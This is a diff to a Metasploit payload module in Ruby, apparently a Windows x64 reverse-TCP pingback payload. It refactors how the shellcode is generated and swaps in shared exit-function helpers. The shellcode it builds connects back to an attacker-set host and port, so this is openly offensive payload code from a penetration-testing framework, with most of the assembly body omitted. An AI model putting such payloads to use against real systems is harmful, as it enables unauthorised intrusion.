@@ -6,6 +6,8 @@
 require 'msf/core/payload/pingback'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/pingback'
+require 'msf/core/payload/windows/x64/block_api'
+require 'msf/core/payload/windows/x64/exitfunk'
 
 module MetasploitModule
 
@@ -15,6 +17,8 @@ module MetasploitModule
   include Msf::Payload::Single
   include Msf::Payload::Pingback
   include Msf::Payload::Pingback::Options
+  include Msf::Payload::Windows::BlockApi_x64
+  include Msf::Payload::Windows::Exitfunk_x64
 
   def initialize(info = {})
     super(merge_info(info,
@@ -27,7 +31,18 @@ module MetasploitModule
       'Handler'       => Msf::Handler::ReverseTcp,
       'Session'       => Msf::Sessions::Pingback
     ))
-    def generate_stage
+
+    def required_space
+      # Start with our cached default generated size
+      space = cached_size
+
+      # EXITFUNK 'seh' is the worst case, that adds 15 bytes
+      space += 15
+
+      space
+    end
+
+    def generate
       # 22 -> "0x00,0x16"
       # 4444 -> "0x11,0x5c"
       encoded_port = [datastore['LPORT'].to_i, 2].pack("vn").unpack("N").first
@@ -38,6 +53,8 @@ module MetasploitModule
       pingback_sleep = datastore['PingbackSleep']
       self.pingback_uuid ||= self.generate_pingback_uuid
       uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
+      conf = { exitfunk: datastore['EXITFUNC'] }
+
 
       asm = %Q^
         cld                     ; Clear the direction flag.
@@ -241,14 +258,9 @@ module MetasploitModule
             jmp create_socket     ; repeat callback
         ^
       end
-      asm << %Q^
-        exitfunk:
-          pop rax               ; won't be returning, realign the stack with a pop
-          push 0                ;
-          pop rcx               ; set the exit function parameter
-          mov r10, 0x56a2b5f0
-          call rbp              ; ExitProcess(0)
-      ^
+      if conf[:exitfunk]
+        asm << asm_exitfunk(conf)
+      end
       Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
     end
   end
